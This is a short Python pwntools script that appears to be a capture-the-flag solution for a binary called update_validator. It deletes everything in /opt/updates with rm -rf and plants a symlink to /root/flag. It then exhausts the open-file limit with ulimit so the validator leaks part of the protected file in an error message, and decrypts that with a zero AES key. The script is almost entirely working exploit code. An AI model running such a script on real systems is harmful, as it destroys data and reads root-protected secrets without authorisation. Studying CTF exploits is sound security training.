#!/usr/bin/env python3
from pwn import *
import os
from Crypto.Cipher import AES

key = b'\x00' * 16

def make_files():
    for i in range(128):
        fd = open(f"/opt/updates/file_{i}.bin", 'wb')
        fd.close()

if __name__ == "__main__":
    os.system("rm -rf /opt/updates/*")
    os.system("ln -s /root/flag /opt/updates/0")
    make_files()

    p = process(["/bin/bash", "-i"])
    p.recv()
    p.sendline(b"ulimit -n 128")
    p.recv()
    p.sendline(b"./update_validator")

    p.recvuntil(b"wrong header (")
    data = p.recv(16)
    ctx = AES.new(key, AES.MODE_ECB)
    print(ctx.encrypt(data))
